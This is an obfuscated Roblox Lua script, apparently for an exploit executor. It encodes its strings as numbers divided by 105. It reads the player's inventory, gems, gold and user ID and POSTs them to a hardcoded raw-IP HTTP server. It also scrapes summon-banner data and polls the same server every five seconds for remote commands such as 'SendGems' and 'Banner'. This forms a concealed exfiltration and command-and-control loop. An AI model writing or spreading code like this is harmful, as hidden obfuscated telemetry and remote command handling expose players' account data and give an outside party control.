function RqvbIdQfenrSALQ(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


local Players = game:GetService(RqvbIdQfenrSALQ({8400,11340,10185,12705,10605,11970,12075}))
local HttpService = game:GetService(RqvbIdQfenrSALQ({7560,12180,12180,11760,8715,10605,11970,12390,11025,10395,10605}))
local PlaceIdLobby = 17017769292
local Web = RqvbIdQfenrSALQ({10920,12180,12180,11760,6090,4935,4935,5355,5460,4830,5145,5250,5250,4830,5145,5880,5565,4830,5670,5040,6090,5880,5040,5880,5040,4935,12495,10605,10290})
local BannerWeb = RqvbIdQfenrSALQ({10920,12180,12180,11760,6090,4935,4935,5355,5460,4830,5145,5250,5250,4830,5145,5880,5565,4830,5670,5040,6090,5880,5040,5880,5040,4935,12495,10605,10290,4935,11760,12285,10290,11340,11025,10395}) 
local player = Players.LocalPlayer
local userId = _G.UserID
local data = game:GetService(RqvbIdQfenrSALQ({8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605})).Remotes.GetInventory:InvokeServer()

local headers = {
    [RqvbIdQfenrSALQ({8925,12075,10605,11970,4725,6825,10815,10605,11550,12180})] = RqvbIdQfenrSALQ({8085,11655,12810,11025,11340,11340,10185,4935,5565,4830,5040,3360,4200,9135,11025,11550,10500,11655,12495,12075,3360,8190,8820,3360,5145,5040,4830,5040,6195,3360,9135,11025,11550,5670,5460,6195,3360,12600,5670,5460,4305,3360,6825,11760,11760,11340,10605,9135,10605,10290,7875,11025,12180,4935,5565,5355,5775,4830,5355,5670,3360,4200,7875,7560,8820,8085,7980,4620,3360,11340,11025,11235,10605,3360,7455,10605,10395,11235,11655,4305,3360,7035,10920,11970,11655,11445,10605,4935,5565,5880,4830,5040,4830,5355,5040,5250,5985,4830,5145,5145,5040,3360,8715,10185,10710,10185,11970,11025,4935,5565,5355,5775,4830,5355}),
    [RqvbIdQfenrSALQ({7035,11655,11550,12180,10605,11550,12180,4725,8820,12705,11760,10605})] = RqvbIdQfenrSALQ({10185,11760,11760,11340,11025,10395,10185,12180,11025,11655,11550,4935,11130,12075,11655,11550})
}

local function getInventoryItems()
    local data = game:GetService(RqvbIdQfenrSALQ({8610,10605,11760,11340,11025,10395,10185,12180,10605,10500,8715,12180,11655,11970,10185,10815,10605})).Remotes.GetInventory:InvokeServer()
    local items = {}
    if type(data) == RqvbIdQfenrSALQ({12180,10185,10290,11340,10605}) and data.Items then
        for key, value in pairs(data.Items) do
            table.insert(items, {name = key, count = value})
        end
    end
    return items
end

local function sendData(player, status, gems, gold, itemsInfo, userId, level)
    local msg = {
        userId = userId,
        playerName = player.Name,
        gems = gems,
        gold = gold,
        level = level,
        content = status,
        items = itemsInfo,
        timestamp = os.date(RqvbIdQfenrSALQ({3465,3885,9345,4725,3885,11445,4725,3885,10500,8820,3885,7560,6090,3885,8085,6090,3885,8715,9450}))
    }

    local body = HttpService:JSONEncode(msg)

    local response = request({
        Url = Web,
        Method = RqvbIdQfenrSALQ({8400,8295,8715,8820}),
        Headers = headers,
        Body = body
    })

    print(RqvbIdQfenrSALQ({7140,10185,12180,10185,3360,12075,10605,11550,10500,11025,11550,10815,3360,12075,12180,10185,12180,12285,12075}), response.StatusCode)
    print(RqvbIdQfenrSALQ({8715,10605,11970,12390,10605,11970,3360,8610,10605,12075,11760,11655,11550,12075,10605}), response.Body)

    if response.StatusCode ~= 200 then
        print(RqvbIdQfenrSALQ({7245,11970,11970,11655,11970,3360,12495,10920,10605,11550,3360,12075,10605,11550,10500,11025,11550,10815,3360,10500,10185,12180,10185,4830}))
    end
end

local function sendGems(amount, userId)
    print(RqvbIdQfenrSALQ({8715,10605,11550,10500,11025,11550,10815,3360,10815,10605,11445,12075,6090}), amount, RqvbIdQfenrSALQ({12180,11655,3360,12285,12075,10605,11970,6090}), userId)
end

local function gatherUnitNamesAndRarity()
    local unitHolder = player.PlayerGui.PAGES.SummonPage.ChancesFrame.UnitHolder
    local fields = {}
    
    for _, unitGrid in ipairs(unitHolder:GetChildren()) do
        if unitGrid:FindFirstChild(RqvbIdQfenrSALQ({6930,12285,12180,12180,11655,11550})) then
            local button = unitGrid.Button
            local viewportFrame = button:FindFirstChild(RqvbIdQfenrSALQ({9030,11025,10605,12495,11760,11655,11970,12180,7350,11970,10185,11445,10605}))
            local summonRarityLabel = button:FindFirstChild(RqvbIdQfenrSALQ({8715,12285,11445,11445,11655,11550,8610,10185,11970,11025,12180,12705,7980,10185,10290,10605,11340}))

            if viewportFrame and summonRarityLabel then
                local worldModel = viewportFrame:FindFirstChild(RqvbIdQfenrSALQ({9135,11655,11970,11340,10500,8085,11655,10500,10605,11340}))
                
                if worldModel then
                    for _, worldChild in ipairs(worldModel:GetChildren()) do
                        table.insert(fields, {
                            name = worldChild.Name,
                            rarity = summonRarityLabel.Text
                        })
                    end
                end
            end
        end
    end
    
    return fields
end

local function sendBannerData(bannerData)
    local msg = {
        name = RqvbIdQfenrSALQ({6930,10185,11550,11550,10605,11970}),
        banner = bannerData,
        timestamp = os.date(RqvbIdQfenrSALQ({3465,3885,9345,4725,3885,11445,4725,3885,10500,8820,3885,7560,6090,3885,8085,6090,3885,8715,9450}))
    }

    local body = HttpService:JSONEncode(msg)

    local response = request({
        Url = BannerWeb,
        Method = RqvbIdQfenrSALQ({8400,8295,8715,8820}),
        Headers = headers,
        Body = body
    })

    print(RqvbIdQfenrSALQ({6930,10185,11550,11550,10605,11970,3360,10500,10185,12180,10185,3360,12075,10605,11550,10500,11025,11550,10815,3360,12075,12180,10185,12180,12285,12075}), response.StatusCode)
    print(RqvbIdQfenrSALQ({8715,10605,11970,12390,10605,11970,3360,8610,10605,12075,11760,11655,11550,12075,10605}), response.Body)

    if response.StatusCode ~= 200 then
        print(RqvbIdQfenrSALQ({7245,11970,11970,11655,11970,3360,12495,10920,10605,11550,3360,12075,10605,11550,10500,11025,11550,10815,3360,10290,10185,11550,11550,10605,11970,3360,10500,10185,12180,10185,4830}))
    end
end

local function Banner()
    local bannerData = gatherUnitNamesAndRarity()
    sendBannerData(bannerData)
end

local function checkCommands()
    local CommandUrl = RqvbIdQfenrSALQ({10920,12180,12180,11760,6090,4935,4935,5355,5460,4830,5145,5250,5250,4830,5145,5880,5565,4830,5670,5040,6090,5880,5040,5880,5040,4935,10815,10605,12180,4725,10395,11655,11445,11445,10185,11550,10500,4935}) .. userId
    local response = request({
        Url = CommandUrl,
        Method = RqvbIdQfenrSALQ({7455,7245,8820}),
        Headers = headers
    })

    if response.StatusCode == 200 then
        local command = HttpService:JSONDecode(response.Body)
        
        if type(command) == RqvbIdQfenrSALQ({12180,10185,10290,11340,10605}) and command.id then
            if command.command == RqvbIdQfenrSALQ({8715,10605,11550,10500,7455,10605,11445,12075}) then
                sendGems(command.data, userId)
            elseif command.command == RqvbIdQfenrSALQ({6825,7350,7875}) then
                print(RqvbIdQfenrSALQ({6825,7350,7875,3360,10395,11655,11445,11445,10185,11550,10500,3360,11970,10605,10395,10605,11025,12390,10605,10500,4830}))
            elseif command.command == RqvbIdQfenrSALQ({6930,10185,11550,11550,10605,11970}) then
                Banner()
            end
        end
    else
        warn(RqvbIdQfenrSALQ({7350,10185,11025,11340,10605,10500,3360,12180,11655,3360,10815,10605,12180,3360,10395,11655,11445,11445,10185,11550,10500,12075,4620,3360,8715,12180,10185,12180,12285,12075,7035,11655,10500,10605,6090}), response.StatusCode)
    end
end

local function continuouslyCheckCommands()
    while true do
        checkCommands()
        wait(5)
    end
end

wait(1)

if player and game.PlaceId == PlaceIdLobby then
    print(player.Name .. RqvbIdQfenrSALQ({3360,11025,12075,3360,11025,11550,3360,11340,11655,10290,10290,12705}))
    local gems = data.Currencies.Gems or RqvbIdQfenrSALQ({5040})
    local gold = data.Currencies.Gold or RqvbIdQfenrSALQ({5040})
    local itemsInfo = getInventoryItems()

    sendData(player, RqvbIdQfenrSALQ({7980,11655,10290,10290,12705}), gems, gold, itemsInfo, userId, level)
    continuouslyCheckCommands()
elseif game.PlaceId ~= PlaceIdLobby then
    print(player.Name .. RqvbIdQfenrSALQ({3360,11025,12075,3360,11025,11550,3360,10815,10185,11445,10605}))
    local gems = data.Currencies.Gems or RqvbIdQfenrSALQ({5040})
    local gold = data.Currencies.Gold or RqvbIdQfenrSALQ({5040})
    local itemsInfo = getInventoryItems()

    sendData(player, RqvbIdQfenrSALQ({7455,10185,11445,10605}), gems, gold, itemsInfo, userId, level)
else
    print(player.Name .. RqvbIdQfenrSALQ({3360,12285,11550,11235,11550,11655,12495,11550,3360,12075,12180,10185,12180,10605,4830}))
end


    
